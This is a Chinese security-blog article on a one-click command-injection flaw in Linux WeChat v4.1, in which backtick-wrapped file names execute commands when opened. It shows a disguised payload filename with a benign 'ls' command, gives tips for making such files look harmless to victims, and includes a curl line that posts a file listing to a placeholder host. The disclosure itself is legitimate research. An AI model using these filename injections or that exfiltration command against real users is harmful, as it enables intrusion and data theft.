---
title: 【已复现】最新版微信v4.1出现远程命令执行漏洞：one-click RCE on Linux WeChat
url: https://mp.weixin.qq.com/s/szIBIyi0sLgzxGrASEbbRQ
source: Doonsec's feed
date: 2026-02-11
fetch_date: 2026-02-12T04:17:17.185472
---

# 【已复现】最新版微信v4.1出现远程命令执行漏洞：one-click RCE on Linux WeChat

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/x2ibBTFXYHicKLxic4NSk64s5lYdyibX1O2Er1kwtAe5nbkxh4UiaQs5oBIba05nNpKKJEzauJTf6mRtSQK6smPMicBFeAd9MBVvMVxibKvlCbndaM/0?wx_fmt=jpeg)

# 【已复现】最新版微信v4.1出现远程命令执行漏洞：one-click RCE on Linux WeChat

原创

网安武器库
网安武器库

网安武器库

![]()

在小说阅读器中沉浸阅读

**更多干货  点击蓝字 关注我们**

**注：本文仅供学习，坚决反对一切危害网络安全的行为。造成法律后果自行负责！**

**往期回顾**

·[xss\_scanner\_mix：一款自动化深度XSS漏洞扫描工具](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486302&idx=1&sn=08544ff7835ce01fae582f677ad02a98&scene=21#wechat_redirect)

·[StegoScan：CTF自动化隐写识别和解密工具](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486301&idx=1&sn=704da2217fce796fe07611b66c3448d4&scene=21#wechat_redirect)

·[Metasploit Pro：可视化的metasploit渗透测试工具](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486276&idx=1&sn=44e00b0ee13437083417bd8c16f15f0c&scene=21#wechat_redirect)

·[Coda：实现Windows/Linux入侵痕迹抹除](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486251&idx=1&sn=c2c9dc8f482b43d9c5c0384d37eeb8a6&scene=21#wechat_redirect)

·[OSV-Scanner：一款专门于发现开源软件漏洞的扫描器](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486240&idx=1&sn=69241fc574c182a305e1c17747377ae6&scene=21#wechat_redirect)

·[LingOps（灵控）：AWD/AWDP 竞赛自动化平台](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486227&idx=1&sn=c7183a4926281db23003d3e02010fd8f&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eFcsfYatVNptgRDr3kqeFwpGYKFziaX9s7BBcG8prEJFW1g1EickibFyug/640?wx_fmt=png&from=appmsg)

**背景分析**

你是否会想过微信尽然也会有RCE（远程命令执行）[该漏洞截止到Linux最新版v4.1仍存在]，尽管不是实时RCE。事情是这样的，前两天有位友友发现了这样的一个one click rce漏洞：

![](https://mmbiz.qpic.cn/mmbiz_png/x2ibBTFXYHicLmaicLWJ7vL3oNibM52QSaXU3AG4tpBmGpbD8keyicNH0FZSoB7GHoJePXXtF6CJAdbbNqsITnmwjOTx3VX7AVDLNFiayRiatiaXsT8/640?wx_fmt=png&from=appmsg)

      就是linux版的微信对文件名没有进行严格校验，导致将文件名利用反引号包裹就可以在本地执行命令，但是该友友并没有在深入研究，这里我们就较为深入研究一下，毕竟微信也算是国民级软件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eFcsfYatVNptgRDr3kqeFwpGYKFziaX9s7BBcG8prEJFW1g1EickibFyug/640?wx_fmt=png&from=appmsg)

触发条件

首先在linux用命令行来启动wechat（这也是触发rce的前提，可能win上也有这个bug但是被隔离了，不太清楚。）

![](https://mmbiz.qpic.cn/mmbiz_png/x2ibBTFXYHicIJzF3BpzTtxekpI7vpIiapdl3JGcN9ibFztBJ8aRFRcEl1frSkqGzwx8mSkWtSbCwEEkRhFeFOOVfOjvtXdaWiaafYPVnnZhO1eI/640?wx_fmt=png&from=appmsg)

     经过多次尝试，发现并不是所有反引号包裹的文件都可以上传成功，这里我们进针对pdf进行尝试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/x2ibBTFXYHicJllnIhIiak7QpHKAlibJ5BqYzVXKicnZZ9LsibScouib2aj5HF0eGDayCDw4G4k4arC1RMiasyr8uxta97sP86WoibESkAUcL9FjwU2k/640?wx_fmt=png&from=appmsg)

目前发现：

1. 一般文件名纯3个字母可以，超过3个字母大概率会出现发送中断情况，应该是内部出现bug被阻断发送了。

2.文件名形式为3个字母+数字可以（这里可以考虑往十进制转命令的方向考虑），3个字母+数字+字母不行。

3.中文 + | + 3个字母可以（这里就起到了很好的伪装作用，由于文件名过长，受害人认为是普通文件，更易相信和打开）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eFcsfYatVNptgRDr3kqeFwpGYKFziaX9s7BBcG8prEJFW1g1EickibFyug/640?wx_fmt=png&from=appmsg)

复现

我们直接点击`ls`.pdf文件，发现弹出pdf的同时，在命令行也执行ls：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/x2ibBTFXYHicL9QkcEfpAUgEd48ACxmxib8wqKm6oV3WwvoNbe2F8rfVRqlbzjHKMEsQzBnVnObr0yhLjotV1ksUxdbrLAicS9EDEFJZYKkAHMc/640?wx_fmt=png&from=appmsg)

 点击伪装文件，也可以弹出pdf，并在命令行执行ls：

```
`正常文件正常文件正常文件正常文件| ls`.pdf
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/x2ibBTFXYHicLS1sNbHniawukwQteM5BMaoUGVlrXdArFRzxPC5DoMsldwCbU89grActxEzicViabq7wIlayM9yOl8PPiciabUgSNZic6POlxVOibiaAE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eFcsfYatVNptgRDr3kqeFwpGYKFziaX9s7BBcG8prEJFW1g1EickibFyug/640?wx_fmt=png&from=appmsg)

总结

目前由于微信自身的某些阻断，导致并不是所有命令的文件都可以发送，也一定程度上提高了利用难度，类似直接外带数据的命令，一般是会被阻断的，降低了威胁程度。且该漏洞目前仅限linux版本。

```
curl -X POST IP -d "filelist=$(ls | paste -sd, -)"
```

    但该rce在后续也存在被恶意利用的可能性，同时其他版本的如win，也可能存在反引号触发但不易发现的漏洞。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eRUtCzBCFbaMYy1c7utlweibCFXWsicmm9ebyvInBtdsD0QRlUDTdLib1g/640?wx_fmt=png&from=appmsg)

预览时标签不可点

修改于

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ujZsao69o9To7R2EPMICOxibwVeWgBhbMqg4icbbohwQibUQoRcx6ymIwZylKcXjdYCZWgQcibhibzqTyA/0?wx_fmt=png)

网安武器库

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ujZsao69o9To7R2EPMICOxibwVeWgBhbMqg4icbbohwQibUQoRcx6ymIwZylKcXjdYCZWgQcibhibzqTyA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过